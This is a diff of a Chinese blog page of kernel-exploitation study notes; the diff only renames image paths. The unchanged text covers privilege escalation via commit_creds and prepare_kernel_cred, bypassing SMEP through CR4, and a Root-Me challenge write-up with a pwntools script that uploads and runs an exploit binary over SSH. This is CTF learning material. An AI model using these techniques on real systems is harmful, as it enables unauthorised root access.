@@ -27,63 +27,63 @@
 <meta property="og:site_name" content="Shuwen&#39;s blog">
 <meta property="og:description" content="基础知识 这里只是简单记录了一些笔者认为的重点。  概念性 cred &#x3D;&gt; 进程权限结构体  smep &#x3D;&gt; 执行  smap &#x3D;&gt; 访问  MMAP_MIN_ADDR &#x3D;&gt; 允许mmap映射的最低内存地址  LKMs  相当于内核的可执行程序 不能单独运行，在运行时被链接到内核   lsmod: 列出已经加载的模块  module_init&#x2F;module_exit：在载入">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-15-061423.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143052634.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143128795.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143323513.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531150406602.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531150708860.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151735100.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151809409.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151832106.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210602220742358.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-18-072543.jpg">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603142323422.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603143340595.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145537156.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145615870.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145652475.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603150742793.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603152453197.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603152841301.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604143845221.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604143951129.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144004010.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603220411473.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144540167.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604174655495.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144933474.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604203258087.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604204333432.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604230215674.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604210532727.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604210519934.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605000529882.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605000952674.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605001430795.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605202802017.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605204630220.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605205107457.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605210915873.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605211023321.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605211737963.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605212036394.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605212140400.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606152944747.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606140816472.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144728288.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144740804.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144750687.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144805046.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144818089.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144822285.png">
-<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606154209689.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/2020-03-15-061423.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531143052634.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531143128795.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531143323513.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531150406602.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531150708860.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531151735100.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531151809409.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210531151832106.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210602220742358.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/2020-03-18-072543.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603142323422.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603143340595.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603145537156.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603145615870.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603145652475.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603150742793.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603152453197.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603152841301.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604143845221.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604143951129.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604144004010.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210603220411473.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604144540167.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604174655495.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604144933474.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604203258087.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604204333432.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604230215674.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604210532727.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210604210519934.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605000529882.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605000952674.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605001430795.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605202802017.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605204630220.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605205107457.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605210915873.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605211023321.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605211737963.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605212036394.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210605212140400.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606152944747.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606140816472.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144728288.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144740804.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144750687.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144805046.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144818089.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606144822285.png">
+<meta property="og:image" content="http://yoursite.com/2021/06/05/20-29-undefined/image-20210606154209689.png">
 <meta property="article:published_time" content="2021-06-05T12:29:41.000Z">
 <meta property="article:modified_time" content="2021-06-07T08:07:07.505Z">
 <meta property="article:author" content="Shuwen">
 <meta property="article:tag" content="kernel pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-15-061423.png">
+<meta name="twitter:image" content="http://yoursite.com/2021/06/05/20-29-undefined/2020-03-15-061423.png">
 
 <link rel="canonical" href="http://yoursite.com/2021/06/05/20-29-undefined/">
 
@@ -324,7 +324,7 @@
 <h3 id="thread-info"><a href="#thread-info" class="headerlink" title="thread_info"></a>thread_info</h3><p>内核堆栈与thread_info结构共享4k / 8k的总大小</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/2020-03-15-061423.png" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
+<p><img src="/2021/06/05/20-29-undefined/2020-03-15-061423.png" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
 <h4 id="restart-block"><a href="#restart-block" class="headerlink" title="restart_block"></a>restart_block</h4><ol>
 <li>thread_info中的一个成员</li>
 <li>是每个线程的结构</li>
@@ -501,16 +501,16 @@
 </blockquote>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210531143052634.png" alt="image-20210531143052634"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531143052634.png" alt="image-20210531143052634"></p>
 </li>
 <li><p>将编译好的文件放入文件夹</p>
-<p><img src="/2021/06/05/kernel-study/image-20210531143128795.png" alt="image-20210531143128795"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531143128795.png" alt="image-20210531143128795"></p>
 </li>
 <li><p>打包文件系统</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>执行start.sh，此时qemu里面可以看到test文件</p>
-<p><img src="/2021/06/05/kernel-study/image-20210531143323513.png" alt="image-20210531143323513"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531143323513.png" alt="image-20210531143323513"></p>
 </li>
 </ol>
 <blockquote>
@@ -531,25 +531,25 @@
 <h4 id="第三部分：查找LKMs模块基址"><a href="#第三部分：查找LKMs模块基址" class="headerlink" title="第三部分：查找LKMs模块基址"></a>第三部分：查找LKMs模块基址</h4><p>1.查找模块名</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod</span><br><span class="line">#查看所有模块，模块名为basic1_ch1，得到基址.text基址：0xc8824000</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210531150406602.png" alt="image-20210531150406602"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531150406602.png" alt="image-20210531150406602"></p>
 <p>2.进入节区文件夹，访问<code>.text</code>、<code>.bss</code>、<code>.data</code></p>
 <p>路径：<code>/sys/module/[模块名]/sections</code></p>
-<p><img src="/2021/06/05/kernel-study/image-20210531150708860.png" alt="image-20210531150708860"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531150708860.png" alt="image-20210531150708860"></p>
 <h4 id="第四部分：gdb"><a href="#第四部分：gdb" class="headerlink" title="第四部分：gdb"></a>第四部分：gdb</h4> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file lkms .text地址 (-s .bss .bss地址 -s .data .data地址)</span><br><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/tostring.ko 0xc8824000 -s .bss 0xc8824600 -s .data 0xc8824360</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234](指定端口:-gdb tcp::4869 )</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210531151735100.png" alt="image-20210531151735100"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531151735100.png" alt="image-20210531151735100"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#下断点，一般下在write、read上面</span><br><span class="line">b tostring_write</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210531151809409.png" alt="image-20210531151809409"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531151809409.png" alt="image-20210531151809409"></p>
 <h4 id="第五部分：执行qemu里的c程序"><a href="#第五部分：执行qemu里的c程序" class="headerlink" title="第五部分：执行qemu里的c程序"></a>第五部分：执行qemu里的c程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test</span><br><span class="line">#程序讲断在write函数上</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210531151832106.png" alt="image-20210531151832106"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210531151832106.png" alt="image-20210531151832106"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>kernel 中有两个可以方便的改变权限的函数：</p>
 <ul>
 <li>int commit_creds(struct cred *new)</li>
@@ -560,7 +560,7 @@
 </blockquote>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep commit_creds /proc/kallsyms </span><br><span class="line">grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210602220742358.png" alt="image-20210602220742358"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210602220742358.png" alt="image-20210602220742358"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void* (*prepare_kernel_cred)(void*) KERNCALL &#x3D; (void*) 0xC10711F0;</span><br><span class="line">void* (*commit_creds)(void*) KERNCALL &#x3D; (void*) 0xC1070E80;</span><br></pre></td></tr></table></figure>
 
 <h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
@@ -579,7 +579,7 @@
 <h4 id="smep原理"><a href="#smep原理" class="headerlink" title="smep原理"></a>smep原理</h4><p>内核是根据<code>CR4</code>寄存器的值来判断<code>smep</code>保护是否开启的</p>
 <pre><code>* 当`CR4`寄存器的第`20`位是`1`时，保护开启
 * 是`0`时，保护关闭。</code></pre><p>以下是<code>CR4</code>寄存器的各标志位：</p>
-<p><img src="/2021/06/05/kernel-study/2020-03-18-072543.jpg" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
+<p><img src="/2021/06/05/20-29-undefined/2020-03-18-072543.jpg" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
 <p>因此，如果在内核中存在<code>gadget</code>能让我们修改<code>CR4</code>寄存器的值我们就可以手动来关闭<code>SMEP</code>保护了。</p>
 <h4 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h4><ol>
 <li><p>首先将bzImage解压出vmlinux</p>
@@ -599,7 +599,7 @@
 <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1"><a href="#1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1" class="headerlink" title="1.[Root-Me]LinKern x86 – Buffer overflow basic 1"></a>1.[Root-Me]LinKern x86 – Buffer overflow basic 1</h3><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1" target="_blank" rel="noopener">下载地址</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch1@challenge03.root-me.org</span><br><span class="line"><span class="meta">#</span><span class="bash">password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/06/05/kernel-study/image-20210603142323422.png" alt="image-20210603142323422"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603142323422.png" alt="image-20210603142323422"></p>
 <p>利用scp将文件拷贝倒本地</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2223 app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/* .</span><br><span class="line">scp -P 2223 ./poc.c app-systeme-ch1@challenge03.root-me.org://challenge/app-systeme/ch1/</span><br><span class="line"><span class="comment">#password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>
 
@@ -614,7 +614,7 @@
 <li>25行中，需要分析的LKMs被加载到了<code>/lib/modules/*/rootme/*.ko</code></li>
 </ul>
 <h4 id="分析LKMs文件"><a href="#分析LKMs文件" class="headerlink" title="分析LKMs文件"></a>分析LKMs文件</h4><p>进入<code>/lib/modules/*/rootme/*.ko</code>，找到LKMs文件</p>
-<p><img src="/2021/06/05/kernel-study/image-20210603143340595.png" alt="image-20210603143340595"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603143340595.png" alt="image-20210603143340595"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ file tostring.ko </span><br><span class="line">tostring.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), BuildID[sha1]=de2b579770a3ff522ee27200d85cb2bc1723ef22, not stripped</span><br><span class="line">winter@ubuntu:~/linkern/initramfs/lib/modules/4.10.3/rootme$ checksec tostring.ko </span><br><span class="line">[*] '/home/winter/linkern/initramfs/lib/modules/4.10.3/rootme/tostring.ko'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
 
 <p>（一般情况）加载到ida中分析，不过本程序给了源码，可以直接分析</p>
@@ -625,10 +625,10 @@
 <li><p>打印字符串<code>Tostring: read()\n</code></p>
 </li>
 <li><p>调用了0x8000984，参数是输入的数据</p>
-<p><img src="/2021/06/05/kernel-study/image-20210603145537156.png" alt="image-20210603145537156"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603145537156.png" alt="image-20210603145537156"></p>
 <p>0x8000984在bss段上，且上面有一个0x8000784、0x8000788</p>
-<p><img src="/2021/06/05/kernel-study/image-20210603145615870.png" alt="image-20210603145615870"></p>
-<p><img src="/2021/06/05/kernel-study/image-20210603145652475.png" alt="image-20210603145652475"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603145615870.png" alt="image-20210603145615870"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603145652475.png" alt="image-20210603145652475"></p>
 </li>
 </ul>
 <h5 id="write"><a href="#write" class="headerlink" title="write"></a>write</h5><ul>
@@ -643,7 +643,7 @@
 <li>一次拷贝long long int，也就是八字节</li>
 <li>拷贝的地址是0x8000784</li>
 </ul>
-<p><img src="/2021/06/05/kernel-study/image-20210603150742793.png" alt="image-20210603150742793"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603150742793.png" alt="image-20210603150742793"></p>
 </li>
 <li><p>释放，结束</p>
 </li>
@@ -665,15 +665,15 @@
 <p>所以，拷贝的起始地址0x8000780在调试的时候就是0xc8824604</p>
 <hr>
 <p>执行一次write</p>
-<p><img src="/2021/06/05/kernel-study/image-20210603152453197.png" alt="image-20210603152453197"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603152453197.png" alt="image-20210603152453197"></p>
 <p>执行完40次write，再执行 write(fd,Eip,sizeof(Eip));【也就是将shellcode地址写入了0xc8824804这个地址】</p>
-<p><img src="/2021/06/05/kernel-study/image-20210603152841301.png" alt="image-20210603152841301"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210603152841301.png" alt="image-20210603152841301"></p>
 <h4 id="question"><a href="#question" class="headerlink" title="question"></a>question</h4><blockquote>
 <p>远程提权失败，也不知道为什么，，，权限是变了，但是变得很奇怪。。。</p>
-<p><img src="/2021/06/05/kernel-study/image-20210604143845221.png" alt="image-20210604143845221"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604143845221.png" alt="image-20210604143845221"></p>
 <p>本地ok</p>
-<p><img src="/2021/06/05/kernel-study/image-20210604143951129.png" alt="image-20210604143951129"></p>
-<p><img src="/2021/06/05/kernel-study/image-20210604144004010.png" alt="image-20210604144004010"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604143951129.png" alt="image-20210604143951129"></p>
+<p><img src="/2021/06/05/20-29-undefined/image-20210604144004010.png" alt="image-20210604144004010"></p>
 </blockquote>
 <h5 id="上传脚本"><a href="#上传脚本" class="headerlink" title="上传脚本"></a>上传脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(log_level='debug')</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"challenge03.root-me.org"</span></span><br><span class="line">PORT =  <span class="number">2223</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"app-systeme-ch1"</span></span><br><span class="line">PW = <span class="string">"app-systeme-ch1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span><span class="params">()</span>:</span></span><br><span class="line">    log.info(<span class="string">"Compile"</span>)</span><br><span class="line">    <span class="comment"># os.system("musl-gcc -w -s -static -o3 oob.c -o exp")</span></span><br><span class="line">    os.system(<span class="string">"gcc -m32 -static -o exp poc.c"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"exp"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">"cat benc | base64 -d &gt; bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"./bout"</span>)</span><br><span class="line"></span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">"./startvm.sh"</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
 
@@ -693,7 +693,7 @@
 
 <p>和上一题的init差不多</p>
